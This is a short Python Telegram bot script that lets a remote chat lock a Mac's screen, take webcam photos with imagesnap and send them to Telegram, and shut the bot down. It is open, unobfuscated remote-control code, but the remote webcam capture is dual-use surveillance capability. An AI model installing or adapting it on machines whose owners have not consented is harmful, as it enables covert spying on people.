import telebot
import subprocess
import threading
import keyboard
import os
import io
import pyautogui
from PIL import Image

import validators

chatid = Your_Chat_Id
bot = telebot.TeleBot("Your API")

def lock_screen():
    try:
        subprocess.run(['pmset', 'displaysleepnow'])
        return "Screen locked successfully."
    except Exception as e:
        return "Failed to lock the screen."

@bot.message_handler(commands=['lockscreen'])
def lock_command(message):
    response = lock_screen()
    bot.send_message(message.chat.id, response)

def capture_image(chat_id):
    try:
        subprocess.run(["imagesnap", "img/captured_image.jpg"], check=True)

        with open("img/captured_image.jpg", "rb") as photo:
            bot.send_photo(chat_id, photo)
    except subprocess.CalledProcessError as e:
        bot.send_message(chat_id, f"An error occurred: {e}")
    except Exception as e:
        bot.send_message(chat_id, f"An unexpected error occurred: {e}")

def capture_image_on_keypress(chat_id):
    capture_image(chat_id)

@bot.message_handler(commands=['pic'])
def capture_image_command(message):
    bot.send_message(message.chat.id, "Take a photo.")
    capture_image_on_keypress(message.chat.id)


@bot.message_handler(commands=['exit'])
def exit_command(message):
    bot.send_message(message.chat.id, "Exiting the program.")
    os._exit(0)

bot.polling()
